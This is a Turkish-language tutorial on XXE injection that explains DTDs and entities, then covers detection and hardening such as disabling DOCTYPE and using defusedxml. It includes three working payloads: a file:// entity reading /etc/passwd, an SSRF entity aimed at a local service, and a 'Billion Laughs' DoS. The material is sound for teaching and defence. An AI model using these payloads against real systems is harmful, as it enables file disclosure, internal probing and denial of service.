XML verisi işlenirken **DTD / Entity** özelliklerinin kötüye kullanılmasıyla ortaya çıkan saldırıdır. Basitçe: **XML parser’ı dış kaynaklara/yerel dosyalara erişebiliyorsa**, saldırgan bu yeteneği kullanarak hassas verileri okuyabilir, sunucuyu bağlatabilir veya hizmeti kesintiye uğratabilir. ⚠️😵‍💫

---

## 🧩 **XML’in Temel Özellikleri (Kısa)**

- 📦 **XML**: Yapılandırılmış veri taşımak için kullanılan metin formatı (JSON yaygın olsa da XML hâlâ kullanılır).
    
- 🔁 **Parsing**: XML verisinin program tarafından okunup nesne/struktur haline getirilmesi.
    
- 📐 **DTD (Document Type Definition)**: XML belgesinin yapısını ve entity tanımlarını belirtir.
    
- 🧩 **Entity**: XML içinde tekrar kullanılabilecek değişken/varlık. _Internal_ veya _External_ olabilir.
    
- 🌐 **External entity**: `SYSTEM` operantı ile `file://` veya `http://` gibi kaynaklara işaret eder — bu, parser’ın dış kaynak okumasına izin verdiği anlamına gelir.
    

---

## ⚠️ **XXE Injection Ne Zaman Olur?**

- XML parser **doğrudan** ve **varsayılan ayarlarla** DTD / external entity’leri işlerse.
    
- Kullanıcı kontrollü XML içeriği parse edilirken (örn. API’ye XML göndermek).
    
- Sonuçlar: dosya okuma, SSRF, DoS, bilgi sızdırma vb. 😱
    

---

## 🧪 **Kötü Amaçlı Örnek Payload'lar (Eğitim/Tespit Amaçlı)**

> **Local file okuma (Unix örneği)**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Bu payload, parser dış entity’lere izin veriyorsa `/etc/passwd` içeriğini döndürebilir.

---

> **SSRF tarzı istek yaptırma (sunucudan bir URL’ye istek)**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/secret">
]>
<root>&xxe;</root>
```

Burada hedef sunucu `127.0.0.1:8080` gibi yerel servise istek yaptırılabilir — iç ağ keşfi / hassas endpoint çağırma riski vardır.

---

> **DoS — “Billion Laughs” (Entity patlaması)**

```xml
<?xml version="1.0"?>
<!DOCTYPE lol [
  <!ENTITY a "ha">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<lol>&d;</lol>
```

Bu tip nested entity’ler bellek/CPU patlamasına yol açarak servislerin çökmesine sebep olabilir.

---

## 🔎 **Tespit (Detection) — Nelere Bakmalı?**

- 📜 Parser loglarında beklenmedik DTD/DOCTYPE tanımları.
    
- 📂 Uygulama tarafından erişilen dosya yollarına ilişkin loglar (ör. `/etc/passwd` okunması).
    
- 🌐 Uygulamadan çıkan HTTP istekleri (sunucunun iç ağına doğru yapılan çağrılar).
    
- 🧨 CPU veya bellek kullanımında ani artışlar (DoS göstergesi).
    
- ❗ Otomatize edilmiş güvenlik tarayıcıları (DAST) XXE testleri üretebilir — sonuçları dikkatle analiz et.
    

---

## 🛡️ **Korunma & Güvenli Kodlama Rehberi (Pratik ve Net)**

1. 🚫 **En kolay ve en etkili:** DTD / external entity çözümlemeyi tamamen devre dışı bırak.
    
    - Parser konfigürasyonunda `disallow DOCTYPE` veya `disable external entities` ayarlarını aktif et.
        
2. 🔐 **Güvenli parser kullan:**
    
    - Eğer mümkünse `defusedxml` (Python) veya Java’da güvenlik özellikleri etkinleştirilmiş XML parser’ları kullan.
        
    - Eski/sıradan parser’ları varsayılan ayarlarla kullanmaktan kaçın.
        
3. ✅ **Input validation / kabul listesi (whitelist):**
    
    - Mümkünse XML yerine JSON kullan (XML’a gerçekten ihtiyacın yoksa).
        
    - XML kabul edilecekse schema/validation ile yalnızca beklenen yapıyı onayla.
        
4. 🧰 **Library-level önlemler:**
    
    - Java örneğinde parser özelliklerini ayarla:
        
        - `http://apache.org/xml/features/disallow-doctype-decl` = true
            
        - `http://xml.org/sax/features/external-general-entities` = false
            
        - `http://xml.org/sax/features/external-parameter-entities` = false
            
    - Python’da `defusedxml` kullan: `from defusedxml.ElementTree import fromstring` gibi.
        
5. 🏗️ **Sandbox / ağ kısıtlaması:**
    
    - XML parsing yapılacak hizmetleri izole et (konteyner/sandbox), egress trafiğini kısıtla (sunucunun dışa istek göndermesini engelle).
        
6. 🔒 **Minimum ayrıcalık (least privilege):**
    
    - Uygulama çalıştığı dosya sisteminde sadece ihtiyaç duyduğu dosyalara erişebilsin.
        
7. 📏 **Kaynak limitleri:**
    
    - Parse sırasında süre, bellek ve entity büyüklüğü limitleri koy — DoS riskini azaltır.
        
8. 📋 **Güncel kütüphane kullanımı & yamalar:**
    
    - XML kütüphanelerinin güncel sürümlerini kullan; güvenlik yamalarını uygulamayı unutma.
        

---
## 🧠 **Kısa Özet**

- **XXE**, XML’in DTD/entity özelliklerinin kötüye kullanılmasıyla **dosya okuma**, **SSRF** ve **DoS** gibi tehlikelere yol açar. 📛
    
- **En iyi savunma:** DOCTYPE/entity çözümlemeyi kapatmak, güvenli parser kullanmak ve ağ/izinleri kısıtlamaktır. 🛡️✅
    

---